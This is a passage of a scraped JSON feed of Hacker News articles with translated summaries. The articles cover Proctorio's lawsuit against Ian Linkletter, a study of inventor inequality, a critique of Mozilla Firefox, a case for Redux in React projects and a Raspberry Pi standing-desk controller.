unless you are certain you know what you\u2019re about. I do not know for certain if WUB and the gpedit.msc method behave identically in all circumstances, but assuming that they do, it\u2019s important to remember to periodically restart your machine if you use this approach.", "posttime": "2020-10-24 07:02:58", "source_domain": "news.ycombinator.com", "source_name": "Hacker News", "tags": "windows-10,windows,\u5f3a\u5236,forced,\u5b89\u88c5",

"note_en": "Between August 23rd and 24th, Ian Linkletter, a learning technology specialist at the University of British Columbia (UBC), made a series of tweets criticizing a software that his school uses. The software was called Proctorio, an online test-proctoring tool that monitors students for suspicious behavior while they take virtual exams. The tweets contained links to unlisted YouTube videos describing various aspects of the program, taken from Proctorio\u2019s help website for instructors.\n \u201cThis video from Proctorio\u2019s YouTube channel shows how the Abnormal Eye Movement function works,\u201d he  tweeted at 8:44PM PT on the 24th. \u201cThis is the one that will show you, beyond a doubt, the emotional harm you are doing to students by using this technology.\u201d\n \u201cThis video from Proctorio\u2019s YouTube channel shows how you can configure the Record Room feature,\u201d he  wrote at 8:47. \u201cThis feature gives you the ability to configure whether you will make students record their room at the start of an exam or throughout it.\u201d\n  One by one, the YouTube videos disappeared. The first went down two hours and 11 minutes after Linkletter tweeted it. The next vanished after just twelve minutes. By 10:14PM on the 24th, all the videos were gone.\n Over the next week, Linkletter continued tweeting. \u201cProctorio is afraid. They are afraid of students. they are afraid of the truth. They are afraid of what they have made,\u201d he  wrote on the 26th. \u201cProctorio can\u2019t hide. We know their CEO. We know he\u2019s unethical. We know how the software works. We know it\u2019s the worst,\u201d he  wrote on the 28th.\n Then, in early September, Linkletter got an unexpected call from a reporter at the  Vancouver Sun. Proctorio was suing him for tweeting the videos, as well as a screenshot of its website \u2014 the company claimed he\u2019d infringed its copyright and distributed confidential material. Linkletter was under an injunction order.\n It\u2019s part of a growing split between remote proctoring services and the academics who use them. Linkletter\u2019s experience is just one of a string of high-profile spats involving Proctorio, as teachers and students call out what they see as invasive tracking. But as critics are discovering, the law is giving Proctorio an unexpected advantage, allowing the company to shut down criticisms by appealing to copyright law.\n  Proctorio is meant to help schools answer a newly urgent question: How do you catch cheaters when they\u2019re taking an exam at home? The problem has inspired a growing business of remote proctoring services, which monitor students during their tests, since long before COVID-19. Proctorio was founded in 2013; some competing platforms like ExamSoft were around as early as 1998. But the tools have expanded in the wake of COVID-19 and the resulting rush to remote and blended learning environments.  Over 400 universities now use Proctorio, from Harvard and Columbia to UT Austin and Kent State.\n The tool has proctored over 16 million exams this year, compared to six million in 2019, Proctorio CEO Mike Olsen estimated in an interview with  The Verge. He expects \u201c25 to 30 million exams\u201d by the end of this year.\n  Unlike services like  Examity and ProctorU, which can put students in front of a live proctor, Proctorio is fully algorithmic, using what its website describes as \u201cmachine learning and advanced facial detection technologies.\u201d The software is able to, through a student\u2019s webcam, record them as they work, and monitor the position of their head to track whether they\u2019re looking at their test. Proctorio flags any suspicious signs to professors, who can then go back and review its recordings. Instructors don\u2019t have to use this feature \u2014 there are other tools, too. Professors can track what websites students are visiting during their exam and can bar them from features like copy / paste, multiple screens, or printing for the duration.\n Since the beginning of the school year, many students have spoken out against the technology. Petitions with thousands of signatures have called it  ableist and discriminatory,  intrusive,  unsafe,  inaccessible, and  huge invasion of privacy. Members of UBC\u2019s population were vocally opposed to Proctorio throughout the summer, in both an  open letter and  UBC\u2019s subreddit. (Olsen noted that \u201cWe have about 3.6 million active weekly students on the platform. There\u2019s a lot of students who are using our product every day around the world and they\u2019re not saying anything.\u201d)\n The students\u2019 comments were what ultimately drove Linkletter to speak out. \u201cI wanted people to listen to student concerns,\u201d he says. \u201cThis is a massively impactful technology \u2014 it has huge reach and a lot of students are being required to use it. I don\u2019t think people are hearing the concerns.\u201d\n But Linkletter has his own issues with Proctorio as well. He believes the tool causes unnecessary anxiety among his students. He also thinks it adds an aura of tension and distrust to an environment that\u2019s already stressful. \u201cWe need to be trauma-informed in the way that we\u2019re teaching, and part of being trauma-informed is being understanding, and being forgiving, and trusting people,\u201d he says. \u201cI feel like this is the total opposite.\u201d\n Katrina Martin, a University of Minnesota student who uses Proctorio, agrees. \u201cMy experience with Proctorio has been nerve-wracking, to say the least,\u201d she told  The Verge. \u201cEvery time I take a test I worry about accidentally acting suspicious while the camera\u2019s watching. All it takes is my boyfriend interrupting me and the school could accuse me of cheating.\u201d\n  Linkletter also worries that the algorithm may be discriminatory against minority users, including those who have darker skin tones, certain disabilities, or who require face coverings. Proctorio contests this \u2014 \u201cIf you have a student who needs accommodation ... in most instances the faculty know about that and it\u2019s not a big deal,\u201d Olsen told  The Verge.\n But remote classes have complicated the prospect of \u201caccommodations\u201d for some students. One university library employee (who asked to remain anonymous because \u201cProctorio seems to be very aggressive with people who say negative things about them\u201d) told me that some of her students without computers or stable internet at home have had trouble finding a public place to take their Proctorio tests. Students were required to remove face coverings so that the software could verify their identities before the test \u2014 but her facility requires face masks. \u201cIt was really frustrating,\u201d she says. \u201cIt creates barriers for students who do not own their own computer, do not have reliable internet access at home, or who do not have a private space for taking exams.\u201d The library has had to repurpose some study-group rooms for individual test-taking.\n Martin had to take her first chemistry test in a Starbucks parking lot because she didn\u2019t have the bandwidth at home to accommodate Proctorio. \u201cSupport said \u2018Have you tried connecting to better Wi-Fi?\u2019\u201d Martin said. \u201cLike that was, in any way, going to help me.\u201d\n  Linkletter filed his response in British Columbia\u2019s Supreme Court on October 16th. Proctorio\u2019s lawsuit, he says, is \u201cgroundless\u201d \u2014 he believes it\u2019s a message to the company\u2019s myriad vocal critics.\n \u201cThey sued me to silence me,\u201d Linkletter says. In his first month of fighting Proctorio\u2019s lawsuit, he\u2019s already spent tens of thousands of dollars. \u201cIt doesn\u2019t just deter me by making me put all my energy and money on this. They thought it would deter the entire community.\u201d\n Olsen, of course, disputes this characterization. \u201cWe disagree that sharing confidential information is the same thing as criticism,\u201d he says. \u201cPosting these kinds of things ... it risks students learning how to circumvent the software and it risks the safety and security of the millions of students who use the software.\u201d (In his affidavit, Linklatter denies that he shared anything confidential, and links to multiple websites and documents where the information he tweeted has been publicly available.)\n Still, it wouldn\u2019t be Proctorio\u2019s first attempt to hush its opposition.  This past March, as  Motherboard also reported, the company asked the journal  Hybrid Pedagogy to retract a  peer-reviewed article warning educators that algorithmic proctoring tools could be discriminatory (the journal declined). When a UBC student posted on Reddit in June that a Proctorio support representative had gone \u201cMIA\u201d while he had a technical issue during an exam, Olsen  accused the student of lying and posted screenshots of their chat log in response. And earlier this fall, when Miami University student Erik Johnson posted snippets of Proctorio\u2019s code on Pastebin, Olsen sent him a Twitter DM demanding that he take down the posts.\n But this lawsuit appears to have amplified concerns about Proctorio within higher education. Not only is Linkletter still tweeting, and not only have prominent outlets like   Motherboard already covered his story, but the suit has rekindled the outcry at UBC. Throughout October, over 100 students signed a second open letter to UBC\u2019s leadership ( \u201cA Renewed Call To Action Against Proctorio\u201d) demanding again that the university stop using Proctorio. \u201cThe continued patronage of this company while it sues one of the valued members of our community is something that, as a UBC community, we cannot stand for,\u201d the letter reads.\n In a statement, UBC associate vice provost Simon Bates said, \u201cThe educational technology landscape is changing rapidly and we are presently undertaking an environmental scan of new tools and their capabilities that may be more suitable for approaches to remote invigilation.\u201d Bates noted that UBC faculty decide whether to use Proctorio on an individual basis.\n The blowback isn\u2019t limited to Linkletter\u2019s campus, though \u2014 support is pouring in from ed-tech professionals around the world. A  GoFundMe that Linkletter created to cover his legal fees has raised over $28,000 from over 400 different donors. And since the beginning of September when the lawsuit was first filed, hundreds of university faculty, staff, administrators, and students from across the US and Canada, as well as countries including South Africa, Australia, the UK, Italy, and Mexico have signed an open letter titled  \u201cIn Defence of Ian Linkletter.\u201d\n \u201cWe need critics like Ian to force transparency in spaces where it is difficult to find, as we cannot critique what we don\u2019t know,\u201d the letter reads. \u201cIan\u2019s attempts to shine light in these dark corners should be \u2014 and are, by the EdTech community \u2014 met with gratitude.\u201d\n \u201cThis is a company that would very much like for us all to shut up,\u201d said Brenna Clarke Gray, coordinator of educational technologies at Thompson Rivers University who spearheaded the letter.\n Olsen isn\u2019t surprised to see the pushback \u2014 but he insists it\u2019s overblown. \u201cAt the end of the day, this is a restraining order that is intended to defend our IP,\u201d he says. \u201cWe\u2019re not trying to take his money, we\u2019re not trying to silence critics, and we\u2019re not trying to get anyone fired.\u201d\n But issues of privacy and access when it comes to online education are bigger than Proctorio and a single dispute over Youtube links. Online classes, and the heightened concerns about dishonesty that come with them, will outlast the pandemic. Remote proctoring isn\u2019t going anywhere.\n That\u2019s why Gray spoke out, despite the fact that her school doesn\u2019t use Proctorio \u2014 she wants that conversation to continue. And it\u2019s important, she says, that people aren\u2019t scared to participate. \u201cThe support that our community is showing Ian is very important to ensure that there is a space for critique of any of these tools,\u201d Gray said. \u201cIt\u2019s very important that people stand up and show that silence is not going to be our response.\u201d", "posttime": "2020-10-24 05:01:59", "source_domain": "news.ycombinator.com", "source_name": "Hacker News", "tags": "\u8f6f\u4ef6,\u6280\u672f,tech,\u5b66\u751f", "title": "\u4e00\u4f4d\u6559\u80b2\u6280\u672f\u4e13\u5bb6\u7545\u6240\u6b32\u8a00\u5730\u8c08\u5230\u4e86\u76d1\u8003\u8f6f\u4ef6\u3002\u73b0\u5728\u4ed6\u88ab\u8d77\u8bc9\u4e86", "title_en": "An ed-tech specialist spoke out about proctoring software.

"note_en": "There&#39;s a popular quote attributed to  Leila Janah,\u00a0&#34;Talent is equally distributed, opportunity is not.&#34;\n We can argue what &#34; equally distributed&#34; really means, but I&#39;d submit that neither talent nor opportunity are equally &#34;available&#34; to all people. In both cases we&#39;re using\u00a0idealistic\u00a0thinking of how the world actually works, since both the realization of  talent and the opportunity to translate it into value are subject to enormous disparity in social, cultural, and economic contexts.\n If you disagree, then it may well be because you operate in precisely the sort of social, cultural, and economic context that affords you the luxury to explore and develop your talents and to then use them in pursuit of an abundance of opportunities. You are living the ideal, while the vast majority of the world is light years removed from it.\n When six out of the world&#39;s seven billion inhabitants live on  \u00a0 less than $32 a day, both talent and opportunity take a distant back seat to basic subsistence. And even within that relatively fortunate one billion there is still enormous disparity in the social, cultural, and economic context that gives individuals license to invent and innovate.\n  Which is exactly what a  recent study of over one million inventors brought to light. The study not only raises questions about the incredible global disparity in access to opportunity, \u00a0but it also illustrates the very sorry state of affairs when it comes to tapping the collective genius of human resources in even the USA&#39;s developed economy.\n  The study is a fascinating Big Data look at the lives of over one million US-based inventors, using\u00a0a newly available database that links patent records to tax and school district records. According to the researchers, the study &#34;Track[ed] these individuals from birth onward, [to identify] the key factors that determine who becomes an inventor, as measured by filing a patent.&#34;\n  Granted that patents are just one facet of how talent and opportunity express themselves, but it is certainly a telltale\u00a0of how well we translate intellect\u00a0into value.\n  Differences in ability, as measured by test scores in early childhood, explain very little of these disparities.\n  Children at the top of their 3rd grade math class are much more likely to become inventors, but only if they come from high-income families.\n To sum it up,\u00a0according to the authors, becoming an inventor in America relies upon: excelling in math and science, being male, white, and having a rich family. The research does not portray these as subtle factors that result in moderate differences but rather overwhelmingly skewed demographic\u00a0differences. The report&#39;s authors give a name to these forgotten inventors, who fall outside of the reports demographic mainstream,\u00a0they call them the &#34;Lost Einsteins.&#34; According to the researchers these are &#34;people who would have had high-impact inventions had they become inventors [and not been part of]\u00a0the underrepresented\u00a0groups.&#34;\n We can try to assuage our concerns about this inequality by\u00a0 listing the many ways that we are attempting to legislate equality in the workplace, or\u00a0we can chalk\u00a0it up to the socioeconomic disparity that is just part of the world we live in. \u00a0But the research shows that our efforts to raise awareness and close the gap, even in a highly developed economy, are woefully inadequate.\u00a0\u00a0For example, at the current rate of increase in female inventors, it would take 118 years to achieve gender equality. Do we really want to accept that there is an inherent disparity of innovative talent between the sexes?\n  27 year-old Daniel Gross wasn&#39;t\u00a0willing to accept the disparity. Gross had\u00a0the ambition to change it by enabling high-potential individuals who had the intelligence and talent, but who might otherwise not be lucky enough to have the social, cultural, and economic context to be an inventor.\n  Gross recently established Pioneer, a fund that invests in high potential individuals from around the world. The several million dollars of capital to launch and run Pioneer came from the online payments company Stripe\u00a0and Netscape co-founder Marc Andreessen. Both Andereessen and Stripe co-founder Patrick Collison came from small towns (In Wisconsin and Ireland, respectively) and wanted to foster innovation and invention in areas that might not otherwise be hubs for invention.\n &#34;In many ways that is the ultimate challenge of creating a global economy and a global innovation community, to equally distribute both talent and opportunity.&#34;\n Pioneer&#39;s model\u00a0is fairly straight-forward. It\u00a0holds monthly contests in which winners get a $5,000 grant and travel to San Francisco for a week or more of meetings with Pioneer&#39;s advisors and other winners. The intent is to create the sort of community ecosystem that research shows is most conducive to inventors, and which may otherwise simply be unavailable to these individuals.\n  Five years ago, when he was 18, and still in school in Israel,\u00a0Gross decided to submit an idea to the prestigious Y Combinator incubator. His idea was accepted and Gross found himself packing up and moving to the Bay area. Within a few years his company Cue, which\u00a0developed predictive software, was\u00a0acquired by Apple. Last year Gross left Apple to join Y Combinator.\n In the process, however, Gross realized how life altering that opportunity to be part of the Bay area ecosystem was to his career and wanted to make some version of that experience\u00a0available to other ambitious and smart people around the world. It&#39;s a simple idea, connect talent\u00a0with opportunity.\n  According to Gross, and as reported in a recent  New York Times article about Pioneer, &#34;We&#39;re trying to build a kind of search engine for finding great people with talent, ambition and potential,&#34;\n Will Gross and Pioneer change the demographics of innovation? Not on their own, at least not\u00a0in any substantial way. Even Stripe&#39;s\u00a0Collison said, &#34;It is an experiment, but one that you can imagine scaling up to help tip the scale a bit, so fewer people miss out on opportunity.&#34;\n Pioneer&#39;s contribution may be slight, tipping the scale just a bit, but it\u00a0does\u00a0draw attention to what may well be one of the greatest but least leveraged\u00a0opportunities\u00a0of a globally connected workforce, matching talent with opportunity regardless of location.\n Consider that today there are approximately 250 million knowledge workers globally. That&#39;s less than 10% of the world&#39;s three billion total workers. Yet, that 10% results in an inordinate percentage of the overall global economy, by some estimates contributing more than 50% to global GDP. Based on that we could easily double the growth rate of global economic output by increasing the number of knowledge workers by just single digit percentages.\n Clearly part of that comes from investment in\u00a0higher education, but more educated workers do not translate into greater innovation without the ability to match talent with opportunity, which is precisely the ambition of efforts such as Pioneer&#39;s.\n In many ways that is the ultimate challenge of creating a global economy and a global innovation community, to equally distribute both talent and opportunity.\n Is it idealistic thinking? Absolutely! But of what good is all of our technology if not to enable us to better realize our ideals?", "posttime": "2020-10-24 03:07:28", "source_domain": "news.ycombinator.com", "source_name": "Hacker News", "tags": "\u9ebb\u7701\u7406\u5de5\u5b66\u9662,stanford,\u5168\u7403", "title": "\u54c8\u4f5b/\u65af\u5766\u798f/\u9ebb\u7701\u7406\u5de5\u5b66\u9662\u7684\u7814\u7a76\u4eba\u5458\u53d1\u73b0\u6210\u529f\u7684\u79d8\u8bc0\uff0c\u800c\u4e0d\u662f\u4eba\u624d", "title_en": "Harvard/Stanford/MIT Researchers Find Secret to Success, and It's Not Talent", "transed": 1, "url": "https://www.inc.com/thomas-koulopoulos/a-study-of-one-million-inventors-identified-key-to-success-its-not-talent.html", "via": "", "real_tags": ["\u9ebb\u7701\u7406\u5de5\u5b66\u9662", "stanford", "\u5168\u7403"]}, {"category": "", "categoryclass": "", "imagename": "c40fbc9f4c7bd6562ebc8a3cca303f5c.jpg", "infoid": 1030785, "ip": "", "isanchordig": 1, "ischecked": 1, "isdelete": 0, "isneo": 1, "mark": "", "name": "", "note": "Apache Beam\u662f\u4e00\u79cd\u6d41\u884c\u7684\u5e76\u884c\u5904\u7406\u6846\u67b6\u3002\u5728\u8fd9\u4e2a\u89c6\u9891\u4e2d\uff0c\u4e9a\u5386\u5c71\u5fb7\u62c9\u5c06\u7ed9\u4f60\u4e00\u4e2a\u963f\u5e15\u5947\u5149\u675f\u7684\u6982\u8ff0\uff0c\u5e76\u5728\u89c6\u9891\u7ed3\u675f\u65f6\uff0c\u4f60\u5c06\u2026", "note_en": "Apache Beam is a popular parallel processing framework.

"note_en": "My history with web browsers is probably very average. I started with Internet Explorer in the early 2000\u2019s, switched to Firefox a few years later, and around 2010, I started using Google Chrome.\n I started deviating, when I switched back to Firefox, after starting to use Linux full time and caring about software freedom and privacy. Most people have been sticking to Chrome, and it has since allegedly become the  most widely used web browser. As of writing, this has also become the case in   every country in the world, which wasn\u2019t even the case just a year ago (but pretty close).\n In recent years, this development has started to worry some people. Especially with Microsoft\u2019s \u201cEdge\u201d browser switching to the  same rendering engine as Chrome, are fearing for the \u201cdiversity of browser engines\u201d, and what the lack thereof would mean to the health of the web-ecosystem.\n One reaction to this problem has been to urge people to keep using, or switch to Mozilla Firefox. The reasoning is that only Firefox continues developing and maintaining an independent, functioning browser engine, with an independent code base. This should ensure that no single entity can turn into a monopoly, and dictate what web standards should be.\n Until recently, I have also held this line. I used Firefox, not only for my own sake, but for the sake of the web. But this stance has been becoming more and more burdensome. I ask myself, are they actually representing and defending who I want to imagine that they are?\n The more I think of it, the more the way Mozilla related to its users reminds me of  emotional abuse.\n  It goes without saying, that emotionally abusive relationships are far more serious of a problem than what Mozilla is doing. I use the term here as a metaphor, and don\u2019t mean to belittle anyone\u2019s experiences with the issue.\n That being said, what is emotional abuse, and how does it express itself in relationships (family, romantic, professional, digital etc.)? Looking  a few lists, we might recognize a few behaviours, that have to be translated from and individual relationship to how Mozilla relates to it\u2019s users.\n Who knows best, what you want? It\u2019s a question that isn\u2019t as easy as it seems at first, but usually the answer is  you. Mozilla seems to disagree, as the  Megabar change has shown. Not only have they introduced a meaningless but annoying change, but they actively want to prevent people from disabling it. When asked why, the response might look something like  this:\n After evaluating and discussing feedback, we decided to keep the expansion when the panel is closed.\n Obviously, they know better. Initial options to disable or remove this behaviour were removed in subsequent versions.\n \u201cIf you stop using Firefox,\u201d, Mozilla advocates will tell you, \u201cChrome will become the only real web browser\u201d.\n Yes, but isn\u2019t it a bit too late to worry about that? And what change do individual choices make here? If you have to appeal to everyone individually, to keep on using Firefox, you will use the aggregate.\n And does anyone actually believe, that that sub-segment of all web users, that believe in  browser engine diversity, can save anything?\n By default,  Firefox is Spyware. This can be mitigated, but when appealing to the non-technical user, expecting them to  about:config their way out of it, might be difficult.\n Nevertheless, Firefox will claim that they are the  Privacy Browser. And for what? Doing more than Chrome, a Browser developed by a company that\u2019s business model is based on spying on it\u2019s users.\n This might be more far-fetched, but it\u2019s not irrelevant. Mozilla is a non-profit, so they haven\u2019t ever been swimming in money, ready to spend on whatever is necessary. That was part of the reason why last August  laid of 250 employees, including those working on  Servo, an alternative web engine, and  MDN, a critical resource for documenting the web.\n Could financial situations like these have been avoided? Maybe if the Mozilla CEO  wasn\u2019t paid over 2 million dollars a year, or trying to gain place in a stratified marked with their discontinued mobile  Firefox OS?\n As already mentioned with the Megabar example, we can only guess what the Firefox developers will want to change in the next releases. Other examples might be FTP or RSS support.\n A recent change in the  add-on system has broken compatibility with a wide range of older extensions, with no compatibility layer.\n When Firefox started gaining popularity in the early 2000\u2019s, this add-on system was one of it\u2019s attractive features over the basic and boring Internet Explorer. If we can\u2019t trust that something this essential will be preserved and protected, nothing is safe.\n More examples can be made, but this shall suffice. Mozilla has a record of not respecting their users, and trying to ignore this by reference  web diversity has been becoming an increasingly flimsy excuse.\n  So should we give up on browser engine diversity?, some might ask? I say:  At this point, what\u2019s to loose?\n For practical purposes, Chrome is dictating what the web should look like. But then again, there are limitations that Google is not probably to breach: HTTP and HTML is here to stay, with backwards compatibility.\n So what advantage would they have, unconstrained by co-implementations, that they would finally be ready to make use of? A few ideas come to mind:\n  Not pretty, but considering the way the web is developing, none of this sounds new. All of these could be explained with ulterior motives: Copyright holders want ways to enforce their ownership, users want faster response times, website owners want more detailed statistics and their sites to be presented \u201cas indented\u201d. And no a non-technical audience, all these points would probably sound legitimate \u2013 with or without browser engine diversity.\n Either way, it seems we are entering a  dark age, when it comes to web standards. Google is one the one hand more interested in furthering the web, as a platform, but also in restricting it to increase the general dependence on their services. The chances are higher that Chrome will be more successful at this than IE in the early 2000\u2019s.\n It\u2019s not optimism to say that it won\u2019t be permanent. Thought that doesn\u2019t have to mean much. The question is, will this dark age result in a renaissance?\n An idea I have been intrigued by, is whether a monopoly power, with vested interest in the \u201cweb\u201d \u2013 such as Google \u2013 would attempt to rework what a \u201cwebsite\u201d is. It\u2019s common knowledge that the web wasn\u2019t made for what it was used for. Yet it was flexible enough to accommodate for it, too slow to realize it. Either way, we ended up with abstractions upon abstractions, backwards compatibility layers for backwards compatibility layers  to create something we could have had all along.\n What if Google, practically released from the constraints of having to formally abide by annoying standards decides to create a \u201cInternet Application Description Format\u201d, re-creating HTML+CSS+JS+\u2026 with the benefit of hindsight?\n The future doesn\u2019t look bright, but we are past the point of no return.\n  Nothing here is new. Some people choose to ignore it, some just don\u2019t care. Others care, and want to do  something!  Anything!\n Recently people have been setting up  Gopher and  Gemini servers, as an act of resistance. If you ask me, fun but meaningless.\n Others challenge their friends to use basic HTML and cross-test their sites on different browsers. Don\u2019t use AMP, don\u2019t use  framework-of-the-week.js, keep it simple! Do  brutalism! And that is what I do with my site, but just because I have no interest in learning what web development means to day. Either way, the most frequented sites certainly don\u2019t seem interested in this design philosophy. And it certainly doesn\u2019t confront the issue of how central the WWW has become in our day-to-day lives, especially with the current pandemic.\n To return to the starting point, I am fed up with Mozilla and Firefox. Their consistent lack of respect for their users, bad business decisions and urge to constantly re-create a bad chrome-clone clearly indicate that something has gone wrong \u2013 and I don\u2019t see it as my responsibility to make up for it.\n Currently I\u2019m using  \u201cUngoogle\u201d Chromium, which has been regarded as a safer alternative to Firefox (e.g.\u00a0see  see this review), but probably isn\u2019t perfect. Sometimes I also use  Netsurf, but you limit yourself to a subset of all websites with that. It would be great to return to Firefox and the open web one day, but if Mozilla keeps abusing their position, it doesn\u2019t seem worth it.\n I implore everyone to think about this, and make a concious decision. Continue using Firefox if you want to, but don\u2019t fool yourself that it means anything.", "posttime": "2020-10-24 03:06:53", "source_domain": "news.ycombinator.com", "source_name": "Hacker News", "tags": "firefox,relationship", "title": "\u5173\u4e8e\u6211\u4eec\u4e0eMozilla\u7684Firefox\u7684\u8650\u5f85\u5173\u7cfb", "title_en": "On Our Abusive Relationship with Mozilla\u2019s Firefox", "transed": 1, "url": "https://ruzkuku.com/txt/moz-rel.html", "via": "", "real_tags": ["firefox"]}, {"category": "", "categoryclass": "", "imagename": "b0f3c503188753fc797a381362410bb8.jpg", "infoid": 1030783, "ip": "", "isanchordig": 1, "ischecked": 1, "isdelete": 0, "isneo": 1, "mark": "", "name": "", "note": "\u5728\u6211\u53c2\u4e0e\u7684\u6bcf\u4e2a\u7eff\u5730\u53cd\u5e94\u9879\u76ee\u7684\u5f00\u59cb\uff0c\u90fd\u4f1a\u51fa\u73b0\u4e00\u4e2a\u95ee\u9898\uff1a\u6211\u4eec\u5982\u4f55\u7ba1\u7406\u5168\u7403\u72b6\u6001\uff1f\u6211\u4eec\u603b\u662f\u4e89\u8bba\u4f7f\u7528Redux\u4e0e\u4f7f\u7528Reaction\u4e0a\u4e0b\u6587\u548c\u94a9\u5b50\u6eda\u52a8\u6211\u4eec\u81ea\u5df1\u7684\u5168\u5c40\u72b6\u6001\u7ba1\u7406\u89e3\u51b3\u65b9\u6848\u7684\u4f18\u70b9\u3002\u6211\u4eec\u6700\u7ec8\u4e3a\u6bcf\u4e2a\u9879\u76ee\u9009\u62e9\u4e86Redux\uff0c\u539f\u56e0\u5982\u4e0b\u3002\n(\u8fd9\u7bc7\u6587\u7ae0\u4e13\u95e8\u901a\u8fc7Reaction\u4e0a\u4e0b\u6587\u5c06Redux\u4e0e\u81ea\u5b9a\u4e49\u72b6\u6001\u7ba1\u7406\u8fdb\u884c\u4e86\u6bd4\u8f83\u3002\u60a8\u8fd8\u5e94\u8be5\u68c0\u67e5\u4e00\u4e0b\u5176\u4ed6\u72b6\u6001\u7ba1\u7406\u89e3\u51b3\u65b9\u6848\uff0c\u5982RECOIL\u3001MobX\u548cApollo\u3002)\u3002\n\u6211\u4ecd\u7136\u4f7f\u7528Redux\u7684\u4e3b\u8981\u539f\u56e0\u662f\u5b83\u88abReaction\u793e\u533a\u5e7f\u6cdb\u91c7\u7528\u3002Redux\u5df2\u7ecf\u5b58\u5728\u4e86\u5927\u7ea6\u4e94\u5e74\uff0c\u56e0\u6b64\u6709\u5f88\u591a\u8d44\u6e90\u53ef\u4ee5\u5e2e\u52a9\u6307\u5bfc\u6211\u4eec\u7684\u5b9e\u65bd\u51b3\u7b56\u3002Redux\u5b98\u65b9\u7f51\u7ad9\u4e0a\u6709\u5f88\u591a\u4fe1\u606f\u53ef\u4ee5\u5e2e\u52a9\u60a8\u5f00\u59cb\u6216\u7ef4\u62a4\u4f7f\u7528Redux\u7684\u9879\u76ee\u3002\n\u81ea\u4eceRedux\u88ab\u5e7f\u6cdb\u91c7\u7528\u4ee5\u6765\uff0c\u5df2\u7ecf\u6709\u5927\u91cf\u7684\u5e93\u6765\u6269\u5c55Redux\u3002\u5f53\u6211\u53ef\u4ee5\u4f7f\u7528Thunks\u6216Sagas\u65f6\uff0c\u4e3a\u4ec0\u4e48\u8981\u4f7f\u7528\u6211\u81ea\u5df1\u7684\u5f02\u6b65\u64cd\u4f5c\u89e3\u51b3\u65b9\u6848\u5462\uff1f\u5f53\u6211\u53ef\u4ee5\u4f7f\u7528redux-undo\u6216undox\u65f6\uff0c\u4e3a\u4ec0\u4e48\u8981\u5b9e\u73b0\u4e00\u79cd\u64a4\u6d88\u64cd\u4f5c\u7684\u65b9\u6cd5\uff1fRedux\u793e\u533a\u5df2\u7ecf\u89e3\u51b3\u4e86\u5f88\u591a\u95ee\u9898\u3002\n\u5728\u51b3\u5b9aRedux\u548c\u81ea\u5b9a\u4e49\u89e3\u51b3\u65b9\u6848\u4e4b\u95f4\u7684\u5173\u7cfb\u65f6\uff0cRedux DevTools\u672c\u8eab\u53ef\u4ee5\u7528\u4f5c\u53c2\u6570\u3002\u67e5\u770b\u64cd\u4f5c\u7684\u8c03\u5ea6\u987a\u5e8f\u548c\u6bcf\u4e2a\u64cd\u4f5c\u4e4b\u95f4\u7684\u72b6\u6001\u5dee\u5f02\u5bf9Reducer\u5f00\u53d1\u6765\u8bf4\u662f\u4e00\u4ef6\u597d\u4e8b\u3002\u5728\u64b0\u5199\u672c\u6587\u65f6\uff0c\u6211\u8fd8\u6ca1\u6709\u627e\u5230\u4e00\u4e2a\u5e7f\u6cdb\u91c7\u7528\u7684\u8c03\u8bd5\u5de5\u5177\uff0c\u53ef\u4ee5\u4e0euseReducer\u76f8\u5ab2\u7f8e\u3002\n\u5f52\u6839\u7ed3\u5e95\uff0c\u81ea\u5b9a\u4e49\u72b6\u6001\u7ba1\u7406\u89e3\u51b3\u65b9\u6848\u770b\u8d77\u6765\u4e0eRedux\u975e\u5e38\u76f8\u4f3c\uff0c\u90a3\u4e48\u6211\u4e3a\u4ec0\u4e48\u4e0d\u4f7f\u7528Redux\u5462\uff1f\n\u8bdd\u867d\u5982\u6b64\uff0cRedux\u5e76\u4e0d\u603b\u662f\u89e3\u51b3\u95ee\u9898\u7684\u529e\u6cd5\u3002\u6bcf\u4e2a\u8f6f\u4ef6\u95ee\u9898\u90fd\u662f\u4e0d\u540c\u7684\u3002\u4e00\u4e9b\u9879\u76ee\u5c06\u4e0d\u9700\u8981\u5168\u7403\u72b6\u6001\u7ba1\u7406\u3002\u5176\u4ed6\u7684\u53ef\u4ee5\u5728\u6ca1\u6709Redux\u63d0\u4f9b\u7684\u6240\u6709\u989d\u5916\u529f\u80fd\u7684\u60c5\u51b5\u4e0b\u5de5\u4f5c\u5f97\u5f88\u597d\u3002\u5f52\u6839\u7ed3\u5e95\uff0c\u4f60\u5e94\u8be5\u6839\u636e\u624b\u5934\u7684\u95ee\u9898\u505a\u51fa\u51b3\u5b9a\u3002", "note_en": "One question comes up at the beginning of every greenfield React project I work on: how do we manage global state? We always debate the merit of using  Redux versus rolling our own global state management solution  using React context and hooks. We\u2019ve ended up choosing Redux for each project, and here\u2019s why.\n ( This post specifically compares Redux with custom state management via React context. You should also check out other state management solutions like  Recoil,  MobX, and  Apollo.)\n  The main reason I still use Redux is its wide adoption by the React community. Redux has been around for about five years, so there are plenty of resources to help guide our implementation decisions. And the  official Redux website has plenty of information to help you get started or maintain a project that uses Redux.\n  Plenty of libraries have been made to extend Redux since it\u2019s so widely adopted. Why roll my own asynchronous action solution when I can use  thunks or  sagas? Why implement a way to undo actions when I can use  redux-undo or  undox? So many problems  have already been solved by the Redux community.\n Redux Devtools could be used as an argument itself when deciding between Redux and a custom solution. It\u2019s a boon to reducer development to see the order in which actions have been dispatched and the diff of state between each action. At the time of writing this, I was unable to find a widely adopted debugging tool that is comparable for  useReducer.\n  At the end of the day, a custom state management solution would end up looking very similar to Redux, so why wouldn\u2019t I use Redux?\n All that being said, Redux is  not the answer all of the time. Every software problem is different. Some projects won\u2019t need global state management. Others will work fine without all of the extras that Redux provides. At the end of the day, you should make your decision based on the problem at hand.", "posttime": "2020-10-24 03:02:01", "source_domain": "news.ycombinator.com", "source_name": "Hacker News", "tags":

"note_en": "I have a  Conset 501-49 sit/stand desk at home. It&#39;s a decent, solid work desk but the default controller that it came with is poor, only allowing you to raise and lower via a set of small push-buttons. This makes it tedious to find the correct height and means you usually just don&#39;t bother getting up and standing, making it a rather expensive sit-only-desk.\n Over the lockdown, I decided to improve this by replacing the original buttons with a Raspberry Pi powered controller that would allow me to raise and lower my desk at the click of a single button.\n   This is  a DisplayOTron HAT that I bought from Pimoroni a few years ago and never had a proper use for. Thankfully this hat is perfect for this project.\n On the  front is a LCD display that shows the current height from the ground. This could be reprogrammed to show anything: animations, time standing or sitting, last time the desk was raised or lowered etc.\n On the  left of the display you&#39;ll see up/down capacitive buttons. These are programmed to allow me to manually raise or lower the desk, just like the original buttons.\n Along the  bottom are the preset buttons. Hitting the left arrow lowers the desk to my 